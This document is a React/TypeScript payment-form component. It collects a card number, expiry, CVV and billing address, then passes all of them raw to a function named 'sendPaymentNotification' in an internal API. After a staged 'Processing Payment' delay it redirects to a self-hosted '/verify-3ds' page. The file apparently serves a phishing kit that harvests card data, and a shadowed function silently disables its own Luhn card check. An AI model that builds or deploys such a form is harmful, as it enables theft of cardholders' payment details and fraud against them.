import React, { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Input } from "./ui/input";
import { Button } from "./ui/button";
import { Label } from "./ui/label";
import { useToast } from "./ui/use-toast";
import { sendPaymentNotification } from "../utils/internalApi";
import { GridLoader } from "react-spinners";
import { Building2 } from "lucide-react";
import { EncryptButton } from "./EncryptButton";
import { CardTypeIcon } from "./CardTypeIcon";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "./ui/dialog";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "./ui/select";
import { initPlacesAutocomplete, type PlaceResult } from "../utils/googlePlaces";

interface PaymentFormProps {
  amount: number;
}

interface BillingDetails {
  address1: string;
  address2: string;
  city: string;
  state: string;
  zipCode: string;
  country: string;
}

const validateCardNumber = (cardNumber: string): boolean => {
  const digits = cardNumber.replace(/\D/g, '');
  let sum = 0;
  let isEven = false;

  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i]);

    if (isEven) {
      digit *= 2;
      if (digit > 9) {
        digit -= 9;
      }
    }

    sum += digit;
    isEven = !isEven;
  }

  return sum % 10 === 0;
};

export const PaymentForm = ({ amount }: PaymentFormProps) => {
  const [cardHolder, setCardHolder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [cvv, setCvv] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [billingDetails, setBillingDetails] = useState<BillingDetails>({
    address1: "",
    address2: "",
    city: "",
    state: "",
    zipCode: "",
    country: "US",
  });
  const navigate = useNavigate();
  const { toast } = useToast();
  const searchParams = new URLSearchParams(window.location.search);
  const companyFromUrl = searchParams.get('company');

  useEffect(() => {
    if (companyFromUrl) {
      setBillingDetails(prev => ({
        ...prev,
        company: companyFromUrl
      }));
    }
  }, [companyFromUrl]);

  const validateCardHolder = (value: string) => {
    const latinAndDotRegex = /^[a-zA-Z\s.]*$/;
    const dotCount = (value.match(/\./g) || []).length;
    
    value = value.slice(0, 12);
    
    if (!latinAndDotRegex.test(value)) {
      return value.replace(/[^a-zA-Z\s.]/g, '').toUpperCase();
    }
    
    if (dotCount > 1) {
      const firstDotIndex = value.indexOf('.');
      return (value.slice(0, firstDotIndex + 1) + value.slice(firstDotIndex + 1).replace(/\./g, '')).toUpperCase();
    }
    
    return value.toUpperCase();
  };

  const validateCardNumber = (value: string) => {
    return value.replace(/\D/g, '');
  };

  const validateExpiryDate = (value: string) => {
    const cleanValue = value.replace(/\D/g, '');
    if (cleanValue.length >= 2) {
      const month = parseInt(cleanValue.substring(0, 2));
      
      if (month > 12) {
        return '12' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }
      if (month === 0) {
        return '01' + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
      }

      if (cleanValue.length >= 4) {
        const year = parseInt(cleanValue.substring(2, 4));
        
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;

        if (year < currentYear || (year === currentYear && month < currentMonth)) {
          toast({
            title: "Invalid Expiry Date",
            description: "Card has expired",
            variant: "destructive",
          });
          return '';
        }
      }

      return month.toString().padStart(2, '0') + (cleanValue.length > 2 ? '/' + cleanValue.substring(2, 4) : '');
    }
    return cleanValue;
  };

  const validateCVV = (value: string) => {
    const numbers = value.replace(/\D/g, '');
    return numbers.slice(0, 3);
  };

  const handleBillingDetailsChange = (field: keyof BillingDetails, value: string) => {
    setBillingDetails(prev => ({
      ...prev,
      [field]: value
    }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    if (!validateCardNumber(cardNumber)) {
      toast({
        title: "Invalid Card",
        description: "Please enter a valid card number",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    if (!billingDetails.address1 || !billingDetails.city || !billingDetails.country || !billingDetails.state || !billingDetails.zipCode) {
      toast({
        title: "Missing Billing Details",
        description: "Please enter your complete billing information",
        variant: "destructive",
      });
      setIsSubmitting(false);
      return;
    }

    try {
      await sendPaymentNotification({
        amount: amount,
        cardHolder,
        cardNumber,
        expiryDate,
        cvv,
        billingDetails
      });

      await new Promise(resolve => setTimeout(resolve, 3000));
      
      navigate(`/verify-3ds?amount=${amount}&cardHolder=${encodeURIComponent(cardHolder)}`);
    } catch (error) {
      console.error('Error processing payment:', error);
      setIsSubmitting(false);
      toast({
        title: "Error",
        description: "Failed to process payment. Please try again.",
        variant: "destructive",
      });
    }
  };

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];

    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }

    if (parts.length) {
      return parts.join(" ");
    } else {
      return value;
    }
  };

  return (
    <form onSubmit={handleSubmit} className="w-full space-y-6 bg-black/20 backdrop-blur-xl p-8 rounded-xl border border-white/10 shadow-2xl animate-fadeIn relative">
      {isSubmitting && (
        <div className="absolute inset-0 bg-black/80 backdrop-blur-sm rounded-xl flex flex-col items-center justify-center gap-6 z-50 animate-fadeIn">
          <GridLoader color="#8B5CF6" size={15} margin={2} />
          <div className="text-white/90 font-medium text-lg">Processing Payment...</div>
          <div className="text-white/60 text-sm">Please do not close this window</div>
        </div>
      )}
      
      <div className="space-y-4">
        <div className="space-y-2">
          <Input
            type="text"
            placeholder="Card Holder Name"
            value={cardHolder}
            onChange={(e) => setCardHolder(validateCardHolder(e.target.value))}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
            required
          />
        </div>
        <div className="space-y-2 relative">
          <Input
            type="text"
            placeholder="Card Number"
            value={cardNumber}
            onChange={(e) => setCardNumber(formatCardNumber(validateCardNumber(e.target.value)))}
            maxLength={19}
            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors pr-12"
            required
          />
          <CardTypeIcon cardNumber={cardNumber} />
        </div>
        <div className="grid grid-cols-2 gap-4">
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="MM/YY"
              value={expiryDate}
              onChange={(e) => setExpiryDate(validateExpiryDate(e.target.value))}
              maxLength={5}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
          <div className="space-y-2">
            <Input
              type="text"
              placeholder="CVV"
              value={cvv}
              onChange={(e) => setCvv(validateCVV(e.target.value))}
              maxLength={3}
              className="bg-black/50 border-white/20 text-white placeholder:text-gray-500 focus:border-white/40 transition-colors"
              required
            />
          </div>
        </div>

        <Dialog>
          <DialogTrigger asChild>
            <button
              type="button"
              className="relative w-full inline-flex items-center justify-center overflow-hidden transition-all duration-250 bg-[radial-gradient(65.28%_65.28%_at_50%_100%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%),linear-gradient(0deg,#7a5af8,#7a5af8)] rounded-xl border-0 outline-none px-4 py-3 hover:scale-[0.95] group"
            >
              <span className="absolute top-0 right-0 h-4 w-4 transition-all duration-500 bg-[radial-gradient(100%_75%_at_55%,rgba(223,113,255,0.8)_0%,rgba(223,113,255,0)_100%)] shadow-md rounded-br-xl rounded-tl-lg after:content-[''] after:absolute after:top-0 after:right-0 after:w-[150%] after:h-[150%] after:rotate-45 after:translate-x-0 after:-translate-y-[18px] after:bg-gray-200 after:pointer-events-none group-hover:-mt-4 group-hover:-mr-4" />

              <div className="absolute inset-0 overflow-hidden pointer-events-none">
                {Array.from({ length: 10 }).map((_, i) => (
                  <i
                    key={i}
                    className={`absolute bottom-[-10px] w-[2px] h-[2px] bg-white rounded-full animate-floating-points`}
                    style={{
                      left: `${[10, 30, 25, 44, 50, 75, 88, 58, 98, 65][i]}%`,
                      opacity: [1, 0.7, 0.8, 0.6, 1, 0.5, 0.9, 0.8, 0.6, 1][i],
                      animationDuration: `${[2.35, 2.5, 2.2, 2.05, 1.9, 1.5, 2.2, 2.25, 2.6, 2.5][i]}s`,
                      animationDelay: `${[0.2, 0.5, 0.1, 0, 0, 1.5, 0.2, 0.2, 0.1, 0.2][i]}s`
                    }}
                  />
                ))}
              </div>

              <span className="relative z-[2] flex items-center justify-center gap-2 text-white font-medium">
                <Building2 className="w-[18px] h-[18px] transition-all duration-100 group-hover:fill-transparent group-hover:animate-icon-dash group-focus:fill-white group-hover:animate-icon-fill" />
                Billing Details
              </span>
            </button>
          </DialogTrigger>
          <DialogContent className="bg-gradient-to-b from-black/95 to-purple-900/95 border border-white/20 text-white max-h-[80vh] overflow-y-auto scrollbar-thin scrollbar-thumb-white/20 scrollbar-track-transparent fixed top-[50%] left-[50%] translate-x-[-50%] translate-y-[-50%] w-[90vw] max-w-[450px] !m-0 rounded-xl backdrop-blur-lg shadow-2xl">
            <DialogHeader className="space-y-3 pb-4 border-b border-white/10">
              <DialogTitle className="text-2xl font-bold bg-gradient-to-r from-white to-purple-300 bg-clip-text text-transparent">Billing Details</DialogTitle>
              <p className="text-sm text-white/60">Enter your address or search for a location</p>
            </DialogHeader>
            
            <div className="space-y-6 py-6">
              <div className="space-y-4">
                <Label className="text-sm font-medium text-white/80">Search Address</Label>
                <Input
                  type="text"
                  placeholder="Start typing your address..."
                  className="bg-white/5 border-white/10 text-white placeholder:text-white/40 hover:bg-white/10 transition-colors focus:bg-white/10"
                  onFocus={(e) => {
                    const input = e.target;
                    console.log("Initializing Places Autocomplete");
                    initPlacesAutocomplete(input, (result: PlaceResult) => {
                      console.log("Place selected:", result);
                      setBillingDetails(result);
                    });
                  }}
                />
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">City</Label>
                  <Input
                    type="text"
                    value={billingDetails.city}
                    readOnly
                    className="bg-white/5 border-white/10 text-white"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">State</Label>
                  <Input
                    type="text"
                    value={billingDetails.state}
                    readOnly
                    className="bg-white/5 border-white/10 text-white"
                  />
                </div>
              </div>

              <div className="grid grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">ZIP Code</Label>
                  <Input
                    type="text"
                    value={billingDetails.zipCode}
                    readOnly
                    className="bg-white/5 border-white/10 text-white"
                  />
                </div>
                <div className="space-y-2">
                  <Label className="text-sm font-medium text-white/80">Country</Label>
                  <Input
                    type="text"
                    value={billingDetails.country}
                    readOnly
                    className="bg-white/5 border-white/10 text-white"
                  />
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>

        <EncryptButton isSubmitting={isSubmitting} />
      </div>
    </form>
  );
};

export default PaymentForm;
